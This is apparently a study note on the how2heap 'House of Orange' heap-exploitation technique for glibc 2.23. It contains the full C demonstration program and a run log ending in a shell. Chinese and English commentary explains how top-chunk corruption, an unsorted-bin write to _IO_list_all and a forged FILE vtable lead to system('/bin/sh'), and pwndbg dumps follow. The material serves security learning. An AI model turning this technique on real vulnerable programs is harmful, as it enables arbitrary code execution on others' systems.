# house_of_orange

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/syscall.h>

/*
  The House of Orange uses an overflow in the heap to corrupt the _IO_list_all pointer
  It requires a leak of the heap and the libc
  Credit: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
*/

/*
   This function is just present to emulate the scenario where
   the address of the function system is known.
*/
int winner ( char *ptr);

int main()
{
    /*
      The House of Orange starts with the assumption that a buffer overflow exists on the heap
      using which the Top (also called the Wilderness) chunk can be corrupted.
      
      At the beginning of execution, the entire heap is part of the Top chunk.
      The first allocations are usually pieces of the Top chunk that are broken off to service the request.
      Thus, with every allocation, the Top chunks keeps getting smaller.
      And in a situation where the size of the Top chunk is smaller than the requested value,
      there are two possibilities:
       1) Extend the Top chunk
       2) Mmap a new page

      If the size requested is smaller than 0x21000, then the former is followed.
    */

    char *p1, *p2;
    size_t io_list_all, *top;

    fprintf(stderr, "The attack vector of this technique was removed by changing the behavior of malloc_printerr, "
        "which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).\n");
//在2.26的更改中,程序不再调用_IO_flush_all_lockp的malloc_printer的行为移除了我们攻击的媒介  
    fprintf(stderr, "Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,"
        "https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51\n");
//由于对glibc 2.24 中 _IO_FILE vtable进行了白名单检查,因此这种攻击手段得到了抑制
    /*
      Firstly, lets allocate a chunk on the heap.
    */

    p1 = malloc(0x400-16);

    /*
       The heap is usually allocated with a top chunk of size 0x21000
       Since we've allocate a chunk of size 0x400 already,
       what's left is 0x20c00 with the PREV_INUSE bit set => 0x20c01.

       The heap boundaries are page aligned. Since the Top chunk is the last chunk on the heap,
       it must also be page aligned at the end.
//heap的边界是页对齐的，因为top chunk是heap的最后一块chunk，所以它也是页对齐的。
       Also, if a chunk that is adjacent to the Top chunk is to be freed,
       then it gets merged with the Top chunk. So the PREV_INUSE bit of the Top chunk is always set.

       So that means that there are two conditions that must always be true.
        1) Top chunk + size has to be page aligned
        2) Top chunk's prev_inuse bit has to be set.

       We can satisfy both of these conditions if we set the size of the Top chunk to be 0xc00 | PREV_INUSE.
       What's left is 0x20c01

       Now, let's satisfy the conditions
       1) Top chunk + size has to be page aligned
       2) Top chunk's prev_inuse bit has to be set.
    */

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    /* 
       Now we request a chunk of size larger than the size of the Top chunk.
       Malloc tries to service this request by extending the Top chunk
       This forces sysmalloc to be invoked.

       In the usual scenario, the heap looks like the following
          |------------|------------|------...----|
          |    chunk   |    chunk   | Top  ...    |
          |------------|------------|------...----|
      heap start                              heap end

       And the new area that gets allocated is contiguous to the old heap end.
       So the new size of the Top chunk is the sum of the old size and the newly allocated size.

       In order to keep track of this change in size, malloc uses a fencepost chunk,
       which is basically a temporary chunk.

       After the size of the Top chunk has been updated, this chunk gets freed.

       In our scenario however, the heap looks like
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | Top  ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                            heap end

       In this situation, the new Top will be starting from an address that is adjacent to the heap end.
       So the area between the second chunk and the heap end is unused.
       And the old Top chunk gets freed.
       Since the size of the Top chunk, when it is freed, is larger than the fastbin sizes,
       it gets added to list of unsorted bins.
       Now we request a chunk of size larger than the size of the top chunk.
       This forces sysmalloc to be invoked.
       And ultimately invokes _int_free

       Finally the heap looks like this:
          |------------|------------|------..--|--...--|---------|
          |    chunk   |    chunk   | free ..  |  ...  | new Top |
          |------------|------------|------..--|--...--|---------|
     heap start                                             new heap end



    */

    p2 = malloc(0x1000);
    /*
      Note that the above chunk will be allocated in a different page
      that gets mmapped. It will be placed after the old heap's end

      Now we are left with the old Top chunk that is freed and has been added into the list of unsorted bins


      Here starts phase two of the attack. We assume that we have an overflow into the old
      top chunk so we could overwrite the chunk's size.
      For the second phase we utilize this overflow again to overwrite the fd and bk pointer
      of this chunk in the unsorted bin list.
      There are two common ways to exploit the current state:
        - Get an allocation in an *arbitrary* location by setting the pointers accordingly (requires at least two allocations)
        - Use the unlinking of the chunk for an *where*-controlled write of the
          libc's main_arena unsorted-bin-list. (requires at least one allocation)

      The former attack is pretty straight forward to exploit, so we will only elaborate
      on a variant of the latter, developed by Angelboy in the blog post linked above.

      The attack is pretty stunning, as it exploits the abort call itself, which
      is triggered when the libc detects any bogus state of the heap.
      Whenever abort is triggered, it will flush all the file pointers by calling
      _IO_flush_all_lockp. Eventually, walking through the linked list in
      _IO_list_all and calling _IO_OVERFLOW on them.

      The idea is to overwrite the _IO_list_all pointer with a fake file pointer, whose
      _IO_OVERLOW points to system and whose first 8 bytes are set to '/bin/sh', so
      that calling _IO_OVERFLOW(fp, EOF) translates to system('/bin/sh').
      More about file-pointer exploitation can be found here:
      https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/

      The address of the _IO_list_all can be calculated from the fd and bk of the free chunk, as they
      currently point to the libc's main_arena.
    */

    io_list_all = top[2] + 0x9a8;

    /*
      We plan to overwrite the fd and bk pointers of the old top,
      which has now been added to the unsorted bins.

      When malloc tries to satisfy a request by splitting this free chunk
      the value at chunk->bk->fd gets overwritten with the address of the unsorted-bin-list
      in libc's main_arena.

      Note that this overwrite occurs before the sanity check and therefore, will occur in any
      case.

      Here, we require that chunk->bk->fd to be the value of _IO_list_all.
      So, we should set chunk->bk to be _IO_list_all - 16
    */
 
    top[3] = io_list_all - 0x10;

    /*
      At the end, the system function will be invoked with the pointer to this file pointer.
      If we fill the first 8 bytes with /bin/sh, it is equivalent to system(/bin/sh)
    */

    memcpy( ( char *) top, "/bin/sh\x00", 8);

    /*
      The function _IO_flush_all_lockp iterates through the file pointer linked-list
      in _IO_list_all.
      Since we can only overwrite this address with main_arena's unsorted-bin-list,
      the idea is to get control over the memory at the corresponding fd-ptr.
      The address of the next file pointer is located at base_address+0x68.
      This corresponds to smallbin-4, which holds all the smallbins of
      sizes between 90 and 98. For further information about the libc's bin organisation
      see: https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/

      Since we overflow the old top chunk, we also control it's size field.
      Here it gets a little bit tricky, currently the old top chunk is in the
      unsortedbin list. For each allocation, malloc tries to serve the chunks
      in this list first, therefore, iterates over the list.
      Furthermore, it will sort all non-fitting chunks into the corresponding bins.
      If we set the size to 0x61 (97) (prev_inuse bit has to be set)
      and trigger an non fitting smaller allocation, malloc will sort the old chunk into the
      smallbin-4. Since this bin is currently empty the old top chunk will be the new head,
      therefore, occupying the smallbin[4] location in the main_arena and
      eventually representing the fake file pointer's fd-ptr.

      In addition to sorting, malloc will also perform certain size checks on them,
      so after sorting the old top chunk and following the bogus fd pointer
      to _IO_list_all, it will check the corresponding size field, detect
      that the size is smaller than MINSIZE "size <= 2 * SIZE_SZ"
      and finally triggering the abort call that gets our chain rolling.
      Here is the corresponding code in the libc:
      https://code.woboq.org/userspace/glibc/malloc/malloc.c.html#3717
    */

    top[1] = 0x61;

    /*
      Now comes the part where we satisfy the constraints on the fake file pointer
      required by the function _IO_flush_all_lockp and tested here:
      https://code.woboq.org/userspace/glibc/libio/genops.c.html#813

      We want to satisfy the first condition:
      fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base
    */

    FILE *fp = (FILE *) top;


    /*
      1. Set mode to 0: fp->_mode <= 0
    */

    fp->_mode = 0; // top+0xc0


    /*
      2. Set write_base to 2 and write_ptr to 3: fp->_IO_write_ptr > fp->_IO_write_base
    */

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 3; // top+0x28


    /*
      4) Finally set the jump table to controlled memory and place system there.
      The jump table pointer is right after the FILE struct:
      base_address+sizeof(FILE) = jump_table

         4-a)  _IO_OVERFLOW  calls the ptr at offset 3: jump_table+0x18 == winner
    */

    size_t *jump_table = &top[12]; // controlled memory
    jump_table[3] = (size_t) &winner;
    *(size_t *) ((size_t) fp + sizeof(FILE)) = (size_t) jump_table; // top+0xd8


    /* Finally, trigger the whole chain by calling malloc */
    malloc(10);

   /*
     The libc's error message will be printed to the screen
     But you'll get a shell anyways.
   */

    return 0;
}

int winner(char *ptr)
{ 
    system(ptr);
    syscall(SYS_exit, 0);
    return 0;
}
```

**result**

```c
The attack vector of this technique was removed by changing the behavior of malloc_printerr, which is no longer calling _IO_flush_all_lockp, in 91e7cf982d0104f0e71770f5ae8e3faf352dea9f (2.26).
Since glibc 2.24 _IO_FILE vtable are checked against a whitelist breaking this exploit,https://sourceware.org/git/?p=glibc.git;a=commit;h=db3476aff19b75c4fdefbe65fcd5f0a90588ba51
*** Error in `./house_of_orange': malloc(): memory corruption: 0x00007f4fbba43520 ***
======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f4fbb6f57f5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8215e)[0x7f4fbb70015e]
/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f4fbb7021d4]
./house_of_orange[0x4007d8]
/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f4fbb69e840]
./house_of_orange[0x4005d9]
======= Memory map: ========
00400000-00401000 r-xp 00000000 08:01 1311170                            /home/niebelungen/Desktop/how2heap/how2heap/glibc_2.23/house_of_orange
00600000-00601000 r--p 00000000 08:01 1311170                            /home/niebelungen/Desktop/how2heap/how2heap/glibc_2.23/house_of_orange
00601000-00602000 rw-p 00001000 08:01 1311170                            /home/niebelungen/Desktop/how2heap/how2heap/glibc_2.23/house_of_orange
01d99000-01ddc000 rw-p 00000000 00:00 0                                  [heap]
7f4fb4000000-7f4fb4021000 rw-p 00000000 00:00 0 
7f4fb4021000-7f4fb8000000 ---p 00000000 00:00 0 
7f4fbb468000-7f4fbb47e000 r-xp 00000000 08:01 1971374                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f4fbb47e000-7f4fbb67d000 ---p 00016000 08:01 1971374                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f4fbb67d000-7f4fbb67e000 rw-p 00015000 08:01 1971374                    /lib/x86_64-linux-gnu/libgcc_s.so.1
7f4fbb67e000-7f4fbb83e000 r-xp 00000000 08:01 1971336                    /lib/x86_64-linux-gnu/libc-2.23.so
7f4fbb83e000-7f4fbba3e000 ---p 001c0000 08:01 1971336                    /lib/x86_64-linux-gnu/libc-2.23.so
7f4fbba3e000-7f4fbba42000 r--p 001c0000 08:01 1971336                    /lib/x86_64-linux-gnu/libc-2.23.so
7f4fbba42000-7f4fbba44000 rw-p 001c4000 08:01 1971336                    /lib/x86_64-linux-gnu/libc-2.23.so
7f4fbba44000-7f4fbba48000 rw-p 00000000 00:00 0 
7f4fbba48000-7f4fbba6e000 r-xp 00000000 08:01 1971308                    /lib/x86_64-linux-gnu/ld-2.23.so
7f4fbbc50000-7f4fbbc53000 rw-p 00000000 00:00 0 
7f4fbbc6c000-7f4fbbc6d000 rw-p 00000000 00:00 0 
7f4fbbc6d000-7f4fbbc6e000 r--p 00025000 08:01 1971308                    /lib/x86_64-linux-gnu/ld-2.23.so
7f4fbbc6e000-7f4fbbc6f000 rw-p 00026000 08:01 1971308                    /lib/x86_64-linux-gnu/ld-2.23.so
7f4fbbc6f000-7f4fbbc70000 rw-p 00000000 00:00 0 
7fff3e3cb000-7fff3e3ec000 rw-p 00000000 00:00 0                          [stack]
7fff3e3ee000-7fff3e3f1000 r--p 00000000 00:00 0                          [vvar]
7fff3e3f1000-7fff3e3f3000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
$ 
```

**analysis**

首先申请了，一个chunk，由于top chunk是页对齐的，所以系统一般首先会给top chunk分配0x21000大小的空间。由于我们申请了0x400，此时top chunk的size为

0x20c01。我们要满足top chunk+size是页对齐的，且top chunk的prev_inuse位被置位，只要0x0c01我们总能满足这两个条件。

接着，申请size大于top chunk的chunk，因为没有任何一个chunk，包括top chunk都无法满足要求。系统会再次为我们分配(mmap)一个top chunk，并将旧的top chunk释放，加入unsorted bin中。新的top chunk在heap的末尾。这时我们没有调用free，而得到了一个空闲块。

接下来，进入攻击的第二阶段。我们要利用终止调用，终止调用是程序检测到堆的任何虚假状态时调用的，它会通过_IO_flush_all_lockp刷新所有文件指针，最终遍历\_IO_list_all并调用对应的\_IO_OVERFLOW(fp, EOF)。

我们要覆盖\_IO\_list_all，使其指向一个fake文件指针，使其\_IO_OVERFLOW指向system，并向fp写入八个字节的数据"/bin/sh"。_IO\_list\_all的地址可以通过free chunk的fd与bk进行计算。之后，我们要伪造vtable，在最后程序会通过\_IO_list_all指针调用对应的函数。所以还要将指针放入unsorted bin中，所以让unsorted bin的bk指向io_list_all - 0x10，我们会在这里触发错误，而这里就是我们伪造的fake_FILE结构。所以会通过这个指针调用其vtable中的函数。

接着，我们修改其中的一些参数绕过以下检查：

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base))
               && _IO_OVERFLOW (fp, EOF) == EOF)
           {
               result = EOF;
          }
```

然后，修改vtable的指针指向我们伪造的jump_table，修改jump_table中\_IO_OVERFLOW对应的偏移位置指向我们的system。

修改top chunk的size为0x61，通过malloc一个不合适的大小的chunk，使top chunk加入到small bins中，top chunk的下一个chunk的满足size<=MINSIZE，触发错误即可。

**gdb**

修改top chunk的size

```c
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x401

Top chunk | PREV_INUSE
Addr: 0x602400
Size: 0xc01
```

malloc(0x1000)

```c
pwndbg> bins
fastbins
0x20: 0x0
0x30: 0x0
0x40: 0x0
0x50: 0x0
0x60: 0x0
0x70: 0x0
0x80: 0x0
unsortedbin
all: 0x602400 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x602400
smallbins
empty
largebins
empty
pwndbg> heap
Allocated chunk | PREV_INUSE
Addr: 0x602000
Size: 0x401

Free chunk (unsortedbin) | PREV_INUSE
Addr: 0x602400
Size: 0xbe1
fd: 0x7ffff7dd1b78
bk: 0x7ffff7dd1b78

Allocated chunk
Addr: 0x602fe0
Size: 0x10

Allocated chunk | PREV_INUSE
Addr: 0x602ff0
Size: 0x11

Allocated chunk
Addr: 0x603000
Size: 0x00
```

伪造的fake_FILE

```c
pwndbg> p *((struct _IO_FILE_plus*) 0x602400)
$5 = {
  file = {
    _flags = 1852400175, 
    _IO_read_ptr = 0x61 <error: Cannot access memory at address 0x61>, 
    _IO_read_end = 0x7ffff7dd1b78 <main_arena+88> "\020@b", 
    _IO_read_base = 0x7ffff7dd2510 "", 
    _IO_write_base = 0x2 <error: Cannot access memory at address 0x2>, 
    _IO_write_ptr = 0x3 <error: Cannot access memory at address 0x3>, 
    _IO_write_end = 0x0, 
    _IO_buf_base = 0x0, 
    _IO_buf_end = 0x0, 
    _IO_save_base = 0x0, 
    _IO_backup_base = 0x0, 
    _IO_save_end = 0x0, 
    _markers = 0x0, 
    _chain = 0x0, 
    _fileno = 0, 
    _flags2 = 0, 
    _old_offset = 4196319, 
    _cur_column = 0, 
    _vtable_offset = 0 '\000', 
    _shortbuf = "", 
    _lock = 0x0, 
    _offset = 0, 
    _codecvt = 0x0, 
    _wide_data = 0x0, 
    _freeres_list = 0x0, 
    _freeres_buf = 0x0, 
    __pad5 = 0, 
    _mode = 0, 
    _unused2 = '\000' <repeats 19 times>
  }, 
  vtable = 0x602460
}
```

